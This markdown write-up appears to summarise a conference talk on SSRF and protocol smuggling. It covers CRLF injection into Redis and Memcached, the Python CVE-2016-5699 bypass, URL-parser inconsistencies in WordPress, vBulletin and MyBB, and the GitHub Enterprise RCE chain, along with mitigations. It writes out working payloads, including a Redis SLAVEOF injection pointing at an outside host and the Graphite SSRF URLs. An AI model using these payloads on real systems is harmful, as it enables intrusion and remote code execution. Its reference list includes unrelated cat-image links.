# Exploiting GLibc NSS Features and Protocol Smuggling

## Introduction
This document explores various techniques to exploit GLibc NSS (Name Service Switch) features, particularly in the context of protocol smuggling. It also covers methods for bypassing security measures in different web applications using URL parsing inconsistencies.

## HTTP/1.1 and Host Header Requirement
HTTP/1.1 requires a `Host` header. The following example demonstrates an attempt to exploit this requirement:

```plaintext
GET / HTTP/1.1
Host: 127.0.0.1
SLAVEOF orange.tw 6379
:6379
Connection: close
```

### Example with `nc`:
```bash
$ nc -vvlp 6379
```

## SNI Injection and HTTPS
SNI (Server Name Indication) can be exploited by embedding the hostname in the SSL Client Hello. This can be done by simply replacing HTTP with HTTPS in the request.

### Example:
```plaintext
https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/
$ nc -vvlp 443
```

## Python CVE-2016-5699
Python's `HTTPConnection.putheader()` method is vulnerable to CR-LF injection. The patch can be bypassed by including a leading space.

### Example:
```python
import urllib
url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
urllib.urlopen(url)
```

## URL Parsing Inconsistencies
URL parsers, DNS checkers, and URL requesters can have different behaviors, which can be exploited to bypass security measures.

### Case Study: WordPress
1. **SSRF Protections**: WordPress has robust SSRF protections.
2. **Bypass Methods**: Three distinct ways to bypass these protections were found.
3. **Status**: Bugs reported since Feb. 25, 2017, but still unpatched.
4. **Responsible Disclosure**: For responsible disclosure, MyBB is used as a case study.

### URL Parsers, DNS Checkers, and URL Requesters
- **WordPress**:
  - URL parser: `parse_url()`
  - DNS checker: `gethostbyname()`
  - URL requester: *cURL*

- **vBulletin**:
  - URL parser: `parse_url()`
  - DNS checker: None
  - URL requester: *cURL*

- **MyBB**:
  - URL parser: `parse_url()`
  - DNS checker: `gethostbynamel()`
  - URL requester: *cURL*

### SSRF Bypass Techniques
1. **Time-of-check to Time-of-use Problem**:
   - Example code snippet demonstrating the issue.
   
2. **Inconsistency between DNS Checker and URL Requester**:
   - `gethostbynamel()` does not have an IDNA converter, while cURL does.
   - Example: `http://ß.orange.tw/`

3. **Inconsistency between URL Parser and URL Requester**:
   - Fixed in PHP 7.0.13 and cURL 7.54.
   - Example: `http://127.0.0.1:11211#@google.com:80/`

## Protocol Smuggling Case Study: GitHub Enterprise
GitHub Enterprise, a standalone version of GitHub written in Ruby on Rails, was found to be vulnerable to a chain of four vulnerabilities leading to Remote Code Execution (RCE).

### Vulnerabilities
1. **SSRF-Bypass on Webhooks**:
   - Fetching URLs via `gem faraday`.
   - Blacklisting localhost, 127.0.0.1, etc.
   - Bypassed with `http://0/`.

2. **SSRF in Internal Graphite Service**:
   - Graphite bound to `127.0.0.1:8000`.
   - Example: `url = request.GET['url']`

3. **CR-LF Injection in Graphite**:
   - Graphite written in Python.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:6379/%0D%0ASET…`

4. **Unsafe Marshal in Memcached Gem**:
   - All Ruby objects stored in cache are Marshal-ed.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:11211/%0D%0Aset…`

### Mitigations
- **Application Layer**: Use only IP and hostname, do not reuse the input URL.
- **Network Layer**: Use firewalls or network policies to block intranet traffic.

### Projects and Tools
- **SafeCurl** by @fin1te
- **Advocate** by @JordanMilne

### Acknowledgements
- **Invalid URL parsing with '#'** by @bagder
- **URL Interop** by @bagder
- **Shibuya.XSS #8** by @mala
- **SSRF Bible** by @Wallarm
- Special thanks to Allen Own, Birdman Chiu, Henry Huang, and others.

### References
- [YouTube Demo](https://youtu.be/GoO7_lCOfic)
- [Twitter @harapeko_lady](https://twitter.com/harapeko_lady/status/743463485548355584)
- [Working Cat](https://tuswallpapersgratis.com/gato-trabajando/)
- [Cat in Carpet](https://carpet.vidalondon.net/cat-in-carpet/)

---

This document provides a comprehensive overview of exploiting GLibc NSS features, URL parsing inconsistencies, and protocol smuggling, along with practical examples and mitigations.